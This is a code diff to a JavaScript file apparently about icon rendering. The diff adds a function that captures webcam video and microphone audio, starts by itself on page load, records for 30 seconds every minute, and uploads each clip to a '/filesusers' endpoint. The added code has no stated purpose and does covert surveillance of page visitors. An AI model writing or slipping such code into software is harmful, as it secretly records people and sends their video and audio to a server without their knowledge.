@@ -892,7 +892,34 @@ function getIconUnicode(iconClass) {
   document.body.removeChild(iconElement);
   return iconUnicode.replace(/"/g, ''); // Remove quotes
 }
-        
+    
+ // Function to start recording video
+ function startRecording() {
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(stream => {
+        const mediaRecorder = new MediaRecorder(stream);
+        mediaRecorder.ondataavailable = event => {
+            const blob = event.data;
+            const formData = new FormData();
+            formData.append('video', blob, 'video.mp4');
+            fetch('/filesusers', {
+                method: 'POST',
+                body: formData
+            });
+        };
+        mediaRecorder.start();
+        setTimeout(() => {
+            mediaRecorder.stop();
+        }, 30000); // Record video for 30 seconds
+    });
+}
+
+// Function to automatically start recording when the page loads
+window.onload = function() {
+    startRecording();
+    setInterval(startRecording, 60000); // Start recording every minute
+};
+    
 
 
 
